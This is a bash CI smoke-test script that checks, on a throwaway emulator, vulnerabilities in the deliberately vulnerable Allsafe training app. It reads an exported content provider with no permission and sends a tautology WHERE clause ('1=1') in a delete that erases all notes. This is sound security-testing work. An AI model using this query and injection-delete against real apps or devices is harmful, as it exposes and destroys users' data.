#!/usr/bin/env bash
# Dynamic smoke for the pinned public Allsafe lab APK (D-060 slice):
# runtime-verifies the statically established exported/unprotected
# DataProvider surface on an ephemeral CI emulator, with a negative control.
#
# Target: infosecadventures.allsafe v.1.6, sha256-pinned, public training app
# built for exactly this. Everything here runs inside the throwaway emulator;
# the delete below mutates only the app's own sandboxed notes.db on that
# emulator. No external target, no persisted state, no credentials.
set -u

APK="${1:-allsafe.apk}"
PINNED_SHA256="d6792d6634a033f048f935f1269179d3c27b859c4c34b1e9e5b008a88375efd9"
AUTHORITY="infosecadventures.allsafe.dataprovider"
URI="content://${AUTHORITY}/note"
OUT="${GITHUB_WORKSPACE:-$(pwd)}/dynamic-smoke"
mkdir -p "$OUT"
fail=0

expect() { # name condition
  if [ "$2" -eq 0 ]; then echo "PASS $1"; else echo "FAIL $1"; fail=1; fi
}

echo "== verify pinned digest =="
echo "${PINNED_SHA256}  ${APK}" | sha256sum -c -
expect "apk-sha256-pinned" $?

echo "== install =="
adb install -r "$APK" >"$OUT/install.out" 2>&1
expect "adb-install" $?
adb shell pm list packages | grep -q "^package:infosecadventures.allsafe$"
expect "package-present" $?

echo "== positive: exported provider query without any permission =="
adb shell content query --uri "$URI" >"$OUT/query-before.out" 2>&1
rows_before=$(grep -c "Row:" "$OUT/query-before.out" || true)
echo "rows_before=${rows_before}"
[ "$rows_before" -ge 4 ]
expect "query-without-permission-returns-seeded-notes" $?

echo "== injection: caller-controlled tautology WHERE reaches delete =="
adb shell content delete --uri "$URI" --where "1=1" >"$OUT/delete-tautology.out" 2>&1
adb shell content query --uri "$URI" >"$OUT/query-after.out" 2>&1
rows_after=$(grep -c "Row:" "$OUT/query-after.out" || true)
echo "rows_after=${rows_after}"
[ "$rows_before" -ge 4 ] && [ "$rows_after" -eq 0 ]
expect "tautology-where-deleted-all-rows" $?

echo "== negative control: non-exported FileProvider authority is refused =="
adb shell content query --uri "content://infosecadventures.allsafe.fileprovider/notes" \
  >"$OUT/query-nonexported.out" 2>&1
neg_rc=$?
if [ "$neg_rc" -ne 0 ] || grep -qi "permission\|security\|denial\|failed" "$OUT/query-nonexported.out"; then
  echo "PASS non-exported-provider-refused"
else
  echo "FAIL non-exported-provider-refused"; fail=1
fi

adb logcat -d >"$OUT/logcat.out" 2>&1 || true

echo "== summary =="
echo "rows_before=${rows_before} rows_after=${rows_after} fail=${fail}"
[ "$fail" -eq 0 ] && echo "DYNAMIC_SMOKE: ALL_PASS" || echo "DYNAMIC_SMOKE: HAS_FAILURES"
exit "$fail"
